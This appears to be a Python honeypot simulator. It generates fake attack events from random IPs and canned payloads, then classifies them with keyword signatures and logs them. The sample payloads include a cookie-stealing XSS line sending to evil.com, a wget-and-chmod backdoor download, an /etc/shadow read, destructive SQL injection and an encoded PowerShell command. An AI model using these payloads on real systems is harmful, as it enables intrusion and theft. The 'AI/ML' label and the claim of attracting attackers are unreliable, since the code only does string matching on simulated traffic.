"""
AI-Powered Cloud Honeypot System
=================================
Simulates a vulnerable cloud server to attract and analyze attackers.
Uses ML-based classification to identify attack types.
"""

import socket
import threading
import json
import time
import random
import os
from datetime import datetime
from collections import defaultdict

# ─── Attack Classification (Simple AI/ML Model) ───────────────────────────────

ATTACK_SIGNATURES = {
    "SQL Injection":     ["' OR '1'='1", "UNION SELECT", "DROP TABLE", "--", "xp_cmdshell", "'; EXEC"],
    "SSH Brute Force":   ["SSH-2.0", "root", "admin", "password", "123456", "letmein"],
    "Port Scan":         ["SYN", "NULL", "XMAS", "FIN", "ACK"],
    "XSS Attack":        ["<script>", "javascript:", "onerror=", "onload=", "alert("],
    "Directory Traversal": ["../", "..\\", "/etc/passwd", "/etc/shadow", "boot.ini"],
    "Command Injection": ["; ls", "| cat", "&& whoami", "`id`", "$(uname"],
    "DDoS Attempt":      ["FLOOD", "amplification", "botnet", "zombie"],
    "Malware Download":  [".exe", ".bat", "wget http", "curl http", "powershell -enc"],
}

SEVERITY_LEVELS = {
    "SQL Injection": "CRITICAL",
    "Command Injection": "CRITICAL",
    "Malware Download": "CRITICAL",
    "SSH Brute Force": "HIGH",
    "XSS Attack": "HIGH",
    "Directory Traversal": "MEDIUM",
    "DDoS Attempt": "HIGH",
    "Port Scan": "LOW",
    "Unknown": "LOW",
}

FAKE_IPS = [
    "185.220.101.47", "45.142.212.100", "192.241.226.31",
    "89.248.167.131", "198.199.85.32", "103.75.190.12",
    "194.165.16.78", "91.108.4.0", "5.188.206.197",
    "185.107.47.215", "45.33.32.156", "162.243.10.151",
    "192.168.1.105", "10.0.0.23", "172.16.0.45",
]

COUNTRIES = {
    "185.220.101.47": "Germany", "45.142.212.100": "Netherlands",
    "192.241.226.31": "United States", "89.248.167.131": "Russia",
    "198.199.85.32": "United States", "103.75.190.12": "China",
    "194.165.16.78": "Iran", "91.108.4.0": "Russia",
    "5.188.206.197": "Russia", "185.107.47.215": "Ukraine",
    "45.33.32.156": "United States", "162.243.10.151": "United States",
    "192.168.1.105": "Internal", "10.0.0.23": "Internal",
    "172.16.0.45": "Internal",
}

SAMPLE_PAYLOADS = [
    "GET /admin HTTP/1.1",
    "' OR '1'='1'; DROP TABLE users--",
    "SSH-2.0-OpenSSH_7.4 root:admin123",
    "<script>document.location='http://evil.com/cookie='+document.cookie</script>",
    "GET /../../../etc/passwd HTTP/1.1",
    "; cat /etc/shadow",
    "wget http://malware.ru/backdoor.sh && chmod +x backdoor.sh",
    "GET / HTTP/1.1 (repeated 10000x)",
    "UNION SELECT username, password FROM users--",
    "powershell -enc JABjAGwAaQBlAG4AdA==",
]

# ─── Intrusion Detection System ───────────────────────────────────────────────

class AIIntrusionDetector:
    def __init__(self):
        self.attack_counts = defaultdict(int)
        self.ip_reputation = {}
        self.blocked_ips = set()

    def classify_attack(self, payload: str) -> str:
        payload_upper = payload.upper()
        scores = defaultdict(int)
        for attack_type, signatures in ATTACK_SIGNATURES.items():
            for sig in signatures:
                if sig.upper() in payload_upper:
                    scores[attack_type] += 1
        if scores:
            return max(scores, key=scores.get)
        return "Unknown"

    def get_confidence(self, payload: str, attack_type: str) -> float:
        if attack_type == "Unknown":
            return round(random.uniform(0.40, 0.65), 2)
        sigs = ATTACK_SIGNATURES.get(attack_type, [])
        matches = sum(1 for s in sigs if s.upper() in payload.upper())
        base = min(0.60 + (matches * 0.12), 0.99)
        return round(base + random.uniform(-0.03, 0.03), 2)

    def analyze(self, ip: str, payload: str) -> dict:
        attack_type = self.classify_attack(payload)
        confidence = self.get_confidence(payload, attack_type)
        severity = SEVERITY_LEVELS.get(attack_type, "LOW")
        self.attack_counts[attack_type] += 1
        self.ip_reputation[ip] = self.ip_reputation.get(ip, 0) + 1
        if self.ip_reputation[ip] >= 3:
            self.blocked_ips.add(ip)
        return {
            "attack_type": attack_type,
            "confidence": confidence,
            "severity": severity,
            "blocked": ip in self.blocked_ips,
            "repeat_offender": self.ip_reputation[ip] > 1,
        }

# ─── Log Storage ──────────────────────────────────────────────────────────────

class AttackLogger:
    def __init__(self, log_file="attack_logs.json"):
        self.log_file = log_file
        self.logs = []
        self._load()

    def _load(self):
        if os.path.exists(self.log_file):
            with open(self.log_file, "r") as f:
                try:
                    self.logs = json.load(f)
                except:
                    self.logs = []

    def save(self, entry: dict):
        self.logs.append(entry)
        with open(self.log_file, "w") as f:
            json.dump(self.logs[-500:], f, indent=2)

    def get_all(self):
        return self.logs

    def get_stats(self):
        if not self.logs:
            return {}
        type_counts = defaultdict(int)
        severity_counts = defaultdict(int)
        ip_counts = defaultdict(int)
        for log in self.logs:
            type_counts[log.get("attack_type", "Unknown")] += 1
            severity_counts[log.get("severity", "LOW")] += 1
            ip_counts[log.get("ip", "0.0.0.0")] += 1
        return {
            "total": len(self.logs),
            "by_type": dict(type_counts),
            "by_severity": dict(severity_counts),
            "top_ips": dict(sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:5]),
        }

# ─── Honeypot Simulator ───────────────────────────────────────────────────────

detector = AIIntrusionDetector()
logger = AttackLogger()

def simulate_attack():
    """Generate a realistic fake attack event."""
    ip = random.choice(FAKE_IPS)
    payload = random.choice(SAMPLE_PAYLOADS)
    port = random.choice([22, 80, 443, 3306, 5432, 8080, 21, 23])
    analysis = detector.analyze(ip, payload)
    entry = {
        "id": int(time.time() * 1000),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "country": COUNTRIES.get(ip, "Unknown"),
        "port": port,
        "payload": payload[:80],
        **analysis,
    }
    logger.save(entry)
    return entry

def run_simulation(interval=4):
    """Continuously simulate attacks in background."""
    while True:
        simulate_attack()
        time.sleep(interval + random.uniform(0, 3))

if __name__ == "__main__":
    print("🍯 AI Cloud Honeypot - Starting simulation...")
    print("📊 Logs saved to: attack_logs.json")
    t = threading.Thread(target=run_simulation, daemon=True)
    t.start()
    try:
        while True:
            stats = logger.get_stats()
            print(f"\r[{datetime.now().strftime('%H:%M:%S')}] Total attacks: {stats.get('total', 0)}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n✅ Honeypot stopped.")